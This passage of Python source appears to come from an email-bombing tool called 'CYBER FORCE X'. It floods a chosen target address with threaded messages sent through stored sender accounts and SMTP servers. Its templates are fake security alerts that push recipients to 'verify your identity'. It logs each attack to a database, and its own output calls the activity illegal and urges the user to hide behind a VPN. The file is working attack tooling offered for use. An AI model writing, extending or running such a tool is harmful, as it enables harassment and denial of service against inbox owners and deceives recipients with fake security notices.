        "NOTICE: Password Reset Request #{:05d}",
        "WARNING: Suspicious Activity #{:06d} | Review Required",
        "UPDATE: Account Settings Changed #{:05d}",
        "ATTENTION: Security Breach Detection #{:06d}",
        "EMERGENCY: Login Attempt #{:06d} from Unknown Device",
        "REQUIRED: Identity Verification #{:05d}"
    ]
    
    BODIES = [
        """SECURITY NOTIFICATION - PRIORITY: HIGH

Dear User,

Our security system has detected unusual activity on your account.

Event ID: CFX-{:08d}
Timestamp: {}
Location: Unknown

Please verify your identity immediately.

This is an automated message from Security System.
""",
        
        """ACCOUNT ALERT - ACTION REQUIRED

ATTENTION REQUIRED!

Multiple failed login attempts detected from suspicious IP addresses.

Case ID: {:06d}
Time: {}
IP Range: Blocked

Review your account activity now.

Security Team
""",
        
        """SYSTEM NOTIFICATION - URGENT

IMPORTANT SYSTEM UPDATE

Your account requires immediate attention due to security protocols.

Reference: {:07d}
Generated: {}

Failure to respond may result in temporary account suspension.

Automated Security System
"""
    ]
    
    def __init__(self, custom_subject="", custom_body=""):
        self.custom_subject = custom_subject
        self.custom_body = custom_body
    
    def generate_subject(self, email_id):
        if self.custom_subject:
            # Add random number to custom subject to make unique
            return f"{self.custom_subject} #{email_id:04d}"
        template = random.choice(self.SUBJECTS)
        return template.format(random.randint(10000, 99999), email_id)
    
    def generate_body(self, email_id):
        if self.custom_body:
            # Add timestamp to custom body
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            return f"{self.custom_body}\n\n---\nID: {email_id:06d}\nTime: {timestamp}"
        template = random.choice(self.BODIES)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return template.format(email_id, timestamp)

# ==================== BOMBER ENGINE ====================
class CyberForceBomber:
    """Main bomber engine with custom options"""
    
    def __init__(self, target, amount, threads, delay, attack_name, selected_senders, custom_subject="", custom_body=""):
        self.target = target
        self.amount = amount
        self.threads = min(threads, amount)
        self.delay = delay
        self.attack_name = attack_name
        self.selected_senders = selected_senders
        self.custom_subject = custom_subject
        self.custom_body = custom_body
        
        self.sent = 0
        self.failed = 0
        self.running = True
        self.lock = threading.Lock()
        self.start_time = datetime.now()
        self.db = AttackDatabase()
        self.generator = AdvancedEmailGenerator(custom_subject, custom_body)
        
        # Anime attack names
        self.anime_attacks = {
            "LIGHTNING": "⚡ CHIDORI STRIKE",
            "STORM": "🌪️ RASENGAN BARRAGE",
            "TSUNAMI": "🌊 WATER DRAGON JUTSU",
            "APOCALYPSE": "🔥 AMATERASU FLAMES",
            "CUSTOM": "👑 BANKAI RELEASE"
        }
    
    def send_email(self, email_id, worker_id):
        """Send single email"""
        if not self.running or not self.selected_senders:
            return False
        
        try:
            # Pick random account from selected senders
            acc = random.choice(self.selected_senders)
            
            # Create email
            msg = MIMEMultipart()
            msg['From'] = acc['email']
            msg['To'] = self.target
            msg['Subject'] = self.generator.generate_subject(email_id)
            
            body = self.generator.generate_body(email_id)
            msg.attach(MIMEText(body, 'plain'))
            
            # Try different SMTP servers
            for config in SMTP_SERVERS:
                try:
                    if config['security'] == 'SSL':
                        server = smtplib.SMTP_SSL(config['host'], config['port'], timeout=8)
                    else:
                        server = smtplib.SMTP(config['host'], config['port'], timeout=8)
                        if config['security'] == 'TLS':
                            server.starttls()
                    
                    server.login(acc['email'], acc['pass'])
                    server.send_message(msg)
                    server.quit()
                    
                    with self.lock:
                        self.sent += 1
                    return True
                    
                except Exception:
                    continue
            
            # All failed
            with self.lock:
                self.failed += 1
            return False
            
        except Exception as e:
            with self.lock:
                self.failed += 1
            return False
    
    def worker(self, worker_id, emails_to_send):
        """Worker thread"""
        for i in range(emails_to_send):
            if not self.running:
                break
            
            email_id = worker_id * emails_to_send + i
            if email_id >= self.amount:
                break
            
            success = self.send_email(email_id, worker_id)
            total = self.sent + self.failed
            
            # Display progress with anime symbols
            anime_symbols = ["⚡", "🔥", "💥", "✨", "🌟", "⭐", "🌀", "🌪️", "🌊", "🔮"]
            symbol = random.choice(anime_symbols)
            
            if success:
                print(f"{Colors.GREEN}[W{worker_id:02d}] {symbol} #{email_id:04d} -> {self.target}{Colors.END}")
            else:
                print(f"{Colors.RED}[W{worker_id:02d}] 💀 #{email_id:04d} -> Failed{Colors.END}")
            
            time.sleep(self.delay + random.uniform(-0.05, 0.05))
    
    def start(self):
        """Start attack with anime opening"""
        print(f"\n{Colors.RED}{'='*70}{Colors.END}")
        anime_name = self.anime_attacks.get(self.attack_name, self.attack_name)
        print(f"{Colors.MAGENTA}[🚀] LAUNCHING {anime_name}!{Colors.END}")
        print(f"{Colors.RED}{'='*70}{Colors.END}")
        
        # Anime opening effect
        AnimeLoading.loading_anime_2(f"ACTIVATING {anime_name}", 1.5)
        
        print(f"{Colors.CYAN}Target:{Colors.END} {self.target}")
        print(f"{Colors.CYAN}Amount:{Colors.END} {self.amount:,} emails")
        print(f"{Colors.CYAN}Threads:{Colors.END} {self.threads}")
        print(f"{Colors.CYAN}Selected Senders:{Colors.END} {len(self.selected_senders)}")
        print(f"{Colors.CYAN}Custom Subject:{Colors.END} {self.custom_subject if self.custom_subject else 'Default'}")
        print(f"{Colors.CYAN}Start Time:{Colors.END} {self.start_time.strftime('%H:%M:%S')}")
        
        # Calculate emails per worker
        emails_per_worker = self.amount // self.threads
        remainder = self.amount % self.threads
        
        # Create workers
        workers = []
        for i in range(self.threads):
            worker_emails = emails_per_worker + (1 if i < remainder else 0)
            if worker_emails > 0:
                w = threading.Thread(target=self.worker, args=(i, worker_emails))
                workers.append(w)
                w.start()
        
        # Monitor progress with anime style
        try:
            while any(w.is_alive() for w in workers) and self.running:
                elapsed = time.time() - self.start_time.timestamp()
                total = self.sent + self.failed
                
                if elapsed > 0 and total > 0:
                    percent = (total / self.amount) * 100
                    speed = total / elapsed
                    
                    # Create anime progress bar
                    bar_length = 30
                    filled = int(bar_length * total / self.amount)
                    bar = "█" * filled + "░" * (bar_length - filled)
                    
                    sys.stdout.write(f"\r{Colors.YELLOW}[📊] {bar} {percent:.1f}% | Sent: {self.sent:,} | Failed: {self.failed:,} | Speed: {speed:.1f}/sec | {elapsed:.1f}s{Colors.END}")
                    sys.stdout.flush()
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Colors.YELLOW}[⚠️] ATTACK INTERRUPTED!{Colors.END}")
        
        # Wait for workers
        for w in workers:
            w.join(timeout=2)
        
        # Final results
        self.end_time = datetime.now()
        elapsed = (self.end_time - self.start_time).total_seconds()
        
        # Save to database
        attack_id = self.db.save_attack(
            self.target, self.attack_name, self.sent, self.failed,
            self.start_time.strftime('%Y-%m-%d %H:%M:%S'),
            self.end_time.strftime('%Y-%m-%d %H:%M:%S'),
            self.threads, len(self.selected_senders),
            self.custom_subject, self.custom_body
        )
        
        # Log events
        self.db.log_event(attack_id, "ATTACK_START", f"Started {self.attack_name} attack on {self.target}")
        self.db.log_event(attack_id, "ATTACK_END", f"Completed: {self.sent} sent, {self.failed} failed")
        
        # Display results with anime ending
        self.display_results(attack_id, elapsed)
    
    def display_results(self, attack_id, elapsed):
        """Display attack results with anime style"""
        print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.GREEN}{'╔════════════════════════════════════════╗'}{Colors.END}")
        print(f"{Colors.GREEN}{'║         ATTACK COMPLETE!               ║'}{Colors.END}")
        print(f"{Colors.GREEN}{'╚════════════════════════════════════════╝'}{Colors.END}")
        print(f"{Colors.CYAN}{'='*70}{Colors.END}")
        
        print(f"\n{Colors.YELLOW}[🎯] TARGET:{Colors.END} {self.target}")
        print(f"{Colors.YELLOW}[⚡] ATTACK TYPE:{Colors.END} {self.attack_name}")
        print(f"{Colors.YELLOW}[📧] EMAILS SENT:{Colors.END} {Colors.GREEN}{self.sent:,}{Colors.END}")
        print(f"{Colors.YELLOW}[💀] EMAILS FAILED:{Colors.END} {Colors.RED}{self.failed:,}{Colors.END}")
        
        total = self.sent + self.failed
        if total > 0:
            success_rate = (self.sent / total) * 100
            rate_color = Colors.GREEN if success_rate > 70 else Colors.YELLOW if success_rate > 40 else Colors.RED
            print(f"{Colors.YELLOW}[📈] SUCCESS RATE:{Colors.END} {rate_color}{success_rate:.1f}%{Colors.END}")
        
        print(f"{Colors.YELLOW}[⏱️] TIME ELAPSED:{Colors.END} {elapsed:.1f}s ({elapsed/60:.1f}m)")
        
        if self.sent > 0 and elapsed > 0:
            print(f"{Colors.YELLOW}[🚀] AVERAGE SPEED:{Colors.END} {self.sent/elapsed:.1f} emails/sec")
        
        print(f"{Colors.YELLOW}[👥] SENDERS USED:{Colors.END} {len(self.selected_senders)}")
        if self.custom_subject:
            print(f"{Colors.YELLOW}[📝] CUSTOM SUBJECT:{Colors.END} {self.custom_subject}")
        
        print(f"{Colors.YELLOW}[💾] DATABASE ID:{Colors.END} {attack_id}")
        print(f"{Colors.YELLOW}[🗂️] DATA SAVED:{Colors.END} cyberforce_attacks.db")
        
        print(f"\n{Colors.RED}[⚠️] WARNING: This was ILLEGAL activity!")
        print(f"[🔒] Use VPN and protect your identity!{Colors.END}")

# ==================== STATISTICS VIEWER ====================
def view_statistics():
    """View attack statistics with anime style"""
    db = AttackDatabase()
    stats = db.get_statistics()
    
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.YELLOW}{'╔════════════════════════════════════════╗'}{Colors.END}")
    print(f"{Colors.YELLOW}{'║         ATTACK STATISTICS             ║'}{Colors.END}")
    print(f"{Colors.YELLOW}{'╚════════════════════════════════════════╝'}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    
    print(f"\n{Colors.GREEN}[📊] TOTAL ATTACKS:{Colors.END} {stats['total_attacks']:,}")
    print(f"{Colors.GREEN}[📧] TOTAL EMAILS SENT:{Colors.END} {stats['total_sent']:,}")
    print(f"{Colors.GREEN}[💀] TOTAL EMAILS FAILED:{Colors.END} {stats['total_failed']:,}")
    print(f"{Colors.GREEN}[📈] OVERALL SUCCESS RATE:{Colors.END} {stats['success_rate']:.1f}%")
    print(f"{Colors.GREEN}[🎯] AVERAGE SUCCESS RATE:{Colors.END} {stats['avg_success']:.1f}%")
    print(f"{Colors.GREEN}[🗂️] DATABASE FILE:{Colors.END} cyberforce_attacks.db")
    
    # Get recent attacks
    conn = sqlite3.connect("cyberforce_attacks.db")
    c = conn.cursor()
    c.execute("SELECT target_email, attack_type, emails_sent, start_time FROM attacks ORDER BY id DESC LIMIT 5")
    recent = c.fetchall()
    conn.close()
    
    if recent:
        print(f"\n{Colors.ORANGE}[🔥] RECENT ATTACKS:{Colors.END}")
        for i, attack in enumerate(recent, 1):
            print(f"  {Colors.CYAN}[{i}] {attack[3][:16]} - {attack[0]} - {attack[1]} - {attack[2]} sent{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.END}")

# ==================== MAIN MENU ====================
def main_menu():
    """Main menu system with anime style"""
    while True:
        matrix_banner()
        
        print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.YELLOW}{'╔════════════════════════════════════════╗'}{Colors.END}")
        print(f"{Colors.YELLOW}{'║         MAIN MENU - ANIME MODE        ║'}{Colors.END}")
        print(f"{Colors.YELLOW}{'╚════════════════════════════════════════╝'}{Colors.END}")
        print(f"{Colors.CYAN}{'='*70}{Colors.END}")
        
        print(f"\n{Colors.GREEN}[1] ⚡ LAUNCH EMAIL ATTACK")
        print(f"[2] 👥 MANAGE ACCOUNT SLOTS (10 slots)")
        print(f"[3] 📊 VIEW ATTACK STATISTICS")
        print(f"[4] 🔧 TEST ACCOUNTS")
        print(f"[5] 💾 EXPORT DATABASE")
        print(f"[0] 🚪 EXIT{Colors.END}")
        
        choice = input(f"\n{Colors.GREEN}[?] Select option: {Colors.END}").strip()
        
        if choice == "1":
            # System checks
            if not system_checks():
                input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.END}")
                continue
            
            # Select senders
            selected_senders = select_senders()
            if not selected_senders:
                print(f"{Colors.RED}[!] No senders selected!{Colors.END}")
                input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.END}")
                continue
            
            # Get custom email content
            custom_subject, custom_body = get_custom_email_content()
            
            # Get target
            target = get_target()
            
            # Get attack config
            amount, threads, delay, attack_name = get_attack_config()
            
            # Confirmation
            print(f"\n{Colors.RED}{'='*70}{Colors.END}")
            print(f"{Colors.YELLOW}[💀] ATTACK CONFIRMATION:{Colors.END}")
            print(f"{Colors.RED}{'='*70}{Colors.END}")
            print(f"{Colors.CYAN}Target:{Colors.END} {target}")
            print(f"{Colors.CYAN}Emails:{Colors.END} {amount:,}")
            print(f"{Colors.CYAN}Attack:{Colors.END} {attack_name}")
            print(f"{Colors.CYAN}Threads:{Colors.END} {threads}")
            print(f"{Colors.CYAN}Senders:{Colors.END} {len(selected_senders)}")
            if custom_subject:
                print(f"{Colors.CYAN}Custom Subject:{Colors.END} {custom_subject}")
            
            confirm = input(f"\n{Colors.GREEN}[?] CONFIRM ATTACK? (y/n): {Colors.END}").lower()
            if confirm == 'y':
                # Start attack
                bomber = CyberForceBomber(target, amount, threads, delay, attack_name, 
                                        selected_senders, custom_subject, custom_body)
                bomber.start()
            
            input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.END}")
        
        elif choice == "2":
            manage_accounts()
            input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.END}")
        
        elif choice == "3":
            view_statistics()
        
        elif choice == "4":
            system_checks()
            input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.END}")
        
        elif choice == "5":
            AnimeLoading.loading_anime_3("EXPORTING DATABASE", 1.5)
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            export_file = f"cyberforce_export_{timestamp}.txt"
            
            db = AttackDatabase()
            stats = db.get_statistics()
            
            with open(export_file, 'w', encoding='utf-8') as f:
                f.write(f"CYBER FORCE X - ATTACK DATABASE EXPORT\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n\n")
                f.write(f"Total Attacks: {stats['total_attacks']}\n")
                f.write(f"Total Emails Sent: {stats['total_sent']}\n")
                f.write(f"Total Emails Failed: {stats['total_failed']}\n")
                f.write(f"Success Rate: {stats['success_rate']:.1f}%\n")
            
            print(f"{Colors.GREEN}[✓] Database exported to: {export_file}{Colors.END}")
            input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.END}")
        
        elif choice == "0":
            print(f"\n{Colors.GREEN}[👋] Exiting CYBER FORCE X v5.0")
            print(f"{Colors.PINK}[✨] Stay anonymous, stay safe! Like anime, keep fighting!{Colors.END}")
            break

# ==================== MAIN ====================
def main():
    try:
        # Login
        if not login_system():
            return
        
        # Initialize database
        AnimeLoading.loading_anime_5("INITIALIZING CYBER FORCE DATABASE", 2.0)
        db = AttackDatabase()
        
        # Main menu
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[✗] Program interrupted!{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[💀] Critical Error: {e}{Colors.END}")
    
    print(f"\n{Colors.MAGENTA}[🔥] CYBER FORCE X v5.0 - Mission Complete!")
    print(f"[🇲🇾] BY MAN FORCE X | OWNER: 601139183035 | ANIME GANG{Colors.END}")

if __name__ == "__main__":
    main()
